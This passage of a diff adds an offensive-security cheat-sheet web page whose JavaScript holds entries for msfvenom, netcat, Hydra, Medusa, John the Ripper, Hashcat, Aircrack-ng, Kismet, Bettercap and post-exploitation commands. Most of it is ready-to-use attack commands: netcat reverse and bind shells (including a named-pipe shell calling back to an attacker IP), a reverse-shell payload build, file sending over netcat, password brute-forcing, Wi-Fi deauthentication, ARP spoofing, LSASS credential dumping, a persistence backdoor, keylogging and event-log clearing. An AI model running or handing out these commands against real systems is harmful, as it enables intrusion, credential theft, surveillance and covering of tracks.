+<pre>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b '\\x00\\x0a\\x0d' -f exe -o shell.exe</pre>
+<p>Generates payload while avoiding specified bad characters.</p>
+`,
+
+netcat:`<h2>Netcat</h2>
+
+<p>Netcat is a versatile networking utility used for port listening, data transfer, and creating reverse or bind shells.</p>
+
+<h3>Listening Mode</h3>
+
+<pre>nc -lvnp 4444</pre>
+<p>Starts a TCP listener on port 4444 with verbose output and numeric IPs.</p>
+
+<pre>nc -lvp 8080</pre>
+<p>Listens for incoming connections on port 8080.</p>
+
+<h3>Connecting to a Target</h3>
+
+<pre>nc IP 4444</pre>
+<p>Connects to a remote host on port 4444.</p>
+
+<pre>nc -nv IP 80</pre>
+<p>Connects to a target using numeric IPs with verbose output.</p>
+
+<h3>Reverse Shell</h3>
+
+<pre>nc -e /bin/bash IP 4444</pre>
+<p>Creates a reverse shell by executing /bin/bash (legacy Netcat).</p>
+
+<pre>nc IP 4444 -e /bin/sh</pre>
+<p>Connects back to the attacker and spawns a shell.</p>
+
+<h3>Bind Shell</h3>
+
+<pre>nc -lvnp 4444 -e /bin/bash</pre>
+<p>Opens a bind shell on the target system.</p>
+
+<h3>Netcat without -e (FIFO Method)</h3>
+
+<pre>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP 4444 > /tmp/f</pre>
+<p>Creates a reverse shell using named pipes when -e is disabled.</p>
+
+<h3>File Transfer</h3>
+
+<pre>nc -lvnp 4444 > file.txt</pre>
+<p>Receives a file from a remote system.</p>
+
+<pre>nc IP 4444 < file.txt</pre>
+<p>Sends a file to a listening Netcat server.</p>
+
+<h3>UDP Mode</h3>
+
+<pre>nc -u -lvnp 4444</pre>
+<p>Starts a UDP listener on port 4444.</p>
+
+<pre>nc -u IP 4444</pre>
+<p>Sends data to a UDP listener.</p>
+
+<h3>Port Scanning</h3>
+
+<pre>nc -zv IP 1-1000</pre>
+<p>Scans ports from 1 to 1000 on the target.</p>
+
+<h3>Banner Grabbing</h3>
+
+<pre>nc IP 80</pre>
+<p>Connects to a service to manually retrieve banners.</p>
+
+<h3>Timeout Control</h3>
+
+<pre>nc -w 5 IP 4444</pre>
+<p>Sets a connection timeout of 5 seconds.</p>
+`,
+
+/* ===================== AUTH ===================== */
+hydra:`<h2>Hydra</h2>
+
+<p>Hydra is a fast and flexible brute-force tool used to test login credentials across many network services.</p>
+
+<pre>hydra -l admin -p 123456 ssh://IP</pre>
+<p>Attempts a brute-force attack using a single username and password.</p>
+
+<pre>hydra -l admin -P pass.txt ssh://IP</pre>
+<p>Uses a password list to brute-force an SSH service.</p>
+
+<pre>hydra -L users.txt -P pass.txt ssh://IP</pre>
+<p>Uses username and password lists for brute-force attacks.</p>
+
+<pre>hydra -C combos.txt ssh://IP</pre>
+<p>Uses username:password combination list.</p>
+
+<pre>hydra -t 4 -L users.txt -P pass.txt ftp://IP</pre>
+<p>Limits the number of parallel connections during the attack.</p>
+`,
+
+medusa:`<h2>Medusa</h2>
+
+<p>Medusa is a parallel login brute-force tool designed for speed and modularity.</p>
+
+<pre>medusa -h IP -u admin -p 123456 -M ssh</pre>
+<p>Attempts SSH login using a single username and password.</p>
+
+<pre>medusa -h IP -u admin -P pass.txt -M ssh</pre>
+<p>Uses a password list to brute-force SSH authentication.</p>
+
+<pre>medusa -h IP -U users.txt -P pass.txt -M ftp</pre>
+<p>Brute-forces FTP login using username and password lists.</p>
+
+<pre>medusa -h IP -U users.txt -P pass.txt -M mysql</pre>
+<p>Attempts MySQL authentication brute-force.</p>
+`,
+
+john:`<h2>John the Ripper</h2>
+
+<p>John the Ripper is a password cracking tool used to identify weak password hashes.</p>
+
+<pre>john hashes.txt</pre>
+<p>Starts cracking password hashes using default settings.</p>
+
+<pre>john --wordlist=rockyou.txt hashes.txt</pre>
+<p>Uses a wordlist to crack password hashes.</p>
+
+<pre>john --rules hashes.txt</pre>
+<p>Applies mangling rules to generate password variations.</p>
+
+<pre>john --show hashes.txt</pre>
+<p>Displays cracked passwords.</p>
+`,
+
+hashcat:`<h2>Hashcat</h2>
+
+<p>Hashcat is a GPU-accelerated password recovery tool supporting multiple attack modes.</p>
+
+<pre>hashcat -m 0 -a 0 hash.txt wordlist.txt</pre>
+<p>Dictionary attack against MD5 hashes.</p>
+
+<pre>hashcat -m 1000 -a 0 hash.txt wordlist.txt</pre>
+<p>Dictionary attack against NTLM hashes.</p>
+
+<pre>hashcat -m 0 -a 3 hash.txt ?a?a?a?a</pre>
+<p>Brute-force attack using mask mode.</p>
+
+<pre>hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt</pre>
+<p>Combination attack using two wordlists.</p>
+
+<pre>hashcat --show hash.txt</pre>
+<p>Displays recovered passwords.</p>
+`,
+
+/* ===================== WIRELESS ===================== */
+aircrack:`<h2>Aircrack-ng</h2>
+
+<p>Aircrack-ng is a wireless security auditing suite used to capture handshakes and crack WEP/WPA/WPA2 networks.</p>
+
+<pre>airmon-ng start wlan0</pre>
+<p>Enables monitor mode on the wireless interface.</p>
+
+<pre>airodump-ng wlan0mon</pre>
+<p>Captures nearby wireless networks and clients.</p>
+
+<pre>airodump-ng --bssid BSSID -c CHANNEL -w capture wlan0mon</pre>
+<p>Targets a specific access point and saves captured packets.</p>
+
+<pre>aireplay-ng --deauth 10 -a BSSID wlan0mon</pre>
+<p>Sends deauthentication packets to force clients to reconnect.</p>
+
+<pre>aircrack-ng -w wordlist.txt capture-01.cap</pre>
+<p>Attempts to crack the captured handshake using a wordlist.</p>
+`,
+
+kismet:`<h2>Kismet</h2>
+
+<p>Kismet is a passive wireless network detector and sniffer for Wi-Fi, Bluetooth, and other wireless protocols.</p>
+
+<pre>kismet</pre>
+<p>Launches the Kismet interface.</p>
+
+<pre>Enable Monitor Mode</pre>
+<p>Enables monitoring to capture wireless traffic.</p>
+
+<pre>View Networks</pre>
+<p>Displays detected wireless networks and clients.</p>
+
+<pre>Filter by SSID or Channel</pre>
+<p>Filters captured data for specific networks.</p>
+
+<pre>Export Data</pre>
+<p>Exports captured packets and logs for further analysis.</p>
+`,
+
+bettercap:`<h2>Bettercap</h2>
+
+<p>Bettercap is a powerful MITM framework used for network reconnaissance, sniffing, and traffic manipulation.</p>
+
+<pre>sudo bettercap -iface eth0</pre>
+<p>Starts Bettercap on a specified network interface.</p>
+
+<pre>net.probe on</pre>
+<p>Discovers live hosts on the local network.</p>
+
+<pre>arp.spoof on</pre>
+<p>Performs ARP spoofing to intercept network traffic.</p>
+
+<pre>net.sniff on</pre>
+<p>Sniffs and displays network packets.</p>
+
+<pre>http.proxy on</pre>
+<p>Enables HTTP proxy for traffic inspection and manipulation.</p>
+`,
+
+/* ===================== POST ===================== */
+post:`<h2>Post-Exploitation</h2>
+
+<p>Post-Exploitation refers to actions performed after gaining access to a target system to gather information, maintain persistence, and escalate privileges.</p>
+
+<h3>System Information</h3>
+
+<pre>sysinfo</pre>
+<p>Displays operating system details and system architecture.</p>
+
+<pre>getuid</pre>
+<p>Shows the current user and privilege level.</p>
+
+<pre>hostname</pre>
+<p>Displays the system hostname.</p>
+
+<h3>Process & User Enumeration</h3>
+
+<pre>ps</pre>
+<p>Lists running processes on the target system.</p>
+
+<pre>whoami</pre>
+<p>Displays the currently logged-in user.</p>
+
+<pre>net user</pre>
+<p>Lists local users on a Windows system.</p>
+
+<h3>Credential Access</h3>
+
+<pre>hashdump</pre>
+<p>Dumps password hashes from the target system.</p>
+
+<pre>lsass dump</pre>
+<p>Attempts to dump credentials from LSASS (Windows).</p>
+
+<h3>Privilege Escalation</h3>
+
+<pre>getsystem</pre>
+<p>Attempts to elevate privileges on Windows systems.</p>
+
+<pre>sudo -l</pre>
+<p>Lists allowed sudo commands on Linux systems.</p>
+
+<h3>Persistence</h3>
+
+<pre>run persistence -X</pre>
+<p>Creates a persistent backdoor that runs on system startup.</p>
+
+<pre>crontab -l</pre>
+<p>Lists scheduled cron jobs on Linux systems.</p>
+
+<h3>File Operations</h3>
+
+<pre>upload file.txt</pre>
+<p>Uploads a file to the target system.</p>
+
+<pre>download file.txt</pre>
+<p>Downloads a file from the target system.</p>
+
+<pre>ls</pre>
+<p>Lists files in the current directory.</p>
+
+<h3>Surveillance</h3>
+
+<pre>screenshot</pre>
+<p>Takes a screenshot of the target desktop.</p>
+
+<pre>keyscan_start</pre>
+<p>Starts keylogging on the target system.</p>
+
+<pre>keyscan_stop</pre>
+<p>Stops the keylogger.</p>
+
+<h3>Network & Lateral Movement</h3>
+
+<pre>ipconfig</pre>
+<p>Displays network configuration on Windows.</p>
+
+<pre>ifconfig</pre>
+<p>Displays network configuration on Linux.</p>
+
+<pre>route</pre>
+<p>Shows routing table information.</p>
+
+<h3>Cleanup</h3>
+
+<pre>clearev</pre>
+<p>Clears event logs on Windows systems.</p>
+
+<pre>exit</pre>
+<p>Terminates the current session.</p>
+`,
+};
+
+links.forEach(link=>{
+  link.onclick=e=>{
+    e.preventDefault();
+    links.forEach(l=>l.classList.remove('active'));
+    link.classList.add('active');
+    toolContent.innerHTML=tools[link.dataset.tool];
+    closeSidebar();
+  }
+});
+
+function setTheme(a1,a2){
+  document.documentElement.style.setProperty('--accent',a1);
+  document.documentElement.style.setProperty('--accent2',a2);
+}
+</script>
+
+</body>
+</html>
